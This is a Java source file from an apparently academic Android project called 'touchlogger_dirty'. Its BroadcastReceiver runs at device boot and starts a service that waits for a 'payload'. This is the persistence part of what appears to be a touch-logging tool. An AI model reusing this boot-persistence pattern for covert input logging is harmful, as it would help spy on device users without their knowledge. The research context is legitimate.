package org.leyfer.thesis.touchlogger_dirty.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.widget.Toast;

import org.leyfer.thesis.touchlogger_dirty.R;
import org.leyfer.thesis.touchlogger_dirty.service.PayloadWaitingService;

public class BootReceiver extends BroadcastReceiver {

    @Override
    public void onReceive(Context context, Intent intent) {
        if (intent.getAction().equals(Intent.ACTION_BOOT_COMPLETED)) {
            Toast.makeText(context, R.string.msg_waiting_response, Toast.LENGTH_SHORT).show();
            PayloadWaitingService.startWaitForPayload(context);
        }
    }
}
